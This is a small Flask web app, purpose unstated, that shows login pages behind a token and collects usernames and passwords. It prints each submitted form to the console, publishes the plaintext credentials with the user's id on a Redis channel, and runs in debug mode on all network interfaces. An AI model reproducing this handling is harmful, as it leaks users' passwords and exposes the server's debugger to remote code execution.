import flask
from flask import abort, render_template, request
import redis
import os
import json

r = redis.Redis(host=os.environ['REDIS_HOST'],
                port=os.environ.get('REDIS_PORT', 6379), db=0)

app = flask.Flask(__name__)


@app.route('/login/<token>')
def login(token):
    user_id = r.get("user_id_by_token:%s" % token)
    if user_id is None:
        abort(403)
    return render_template('login.html', token=token)


@app.route('/continue/<token>', methods=['POST'])
def cont(token):
    user_id = r.get("user_id_by_token:%s" % token)
    if user_id is None:
        abort(403)
    return render_template('continue.html', token=token)


@app.route('/finish/<token>', methods=['POST'])
def finish(token):
    user_id = r.get("user_id_by_token:%s" % token)
    if user_id is None:
        abort(403)
    print(request.form)
    r.publish("login_info", json.dumps({
        "username": request.form['username'],
        "password": request.form['password'],
        "user_id": user_id.decode('utf-8')
    }))
    return render_template('done.html')


app.run(debug=True, host="0.0.0.0", port=2137)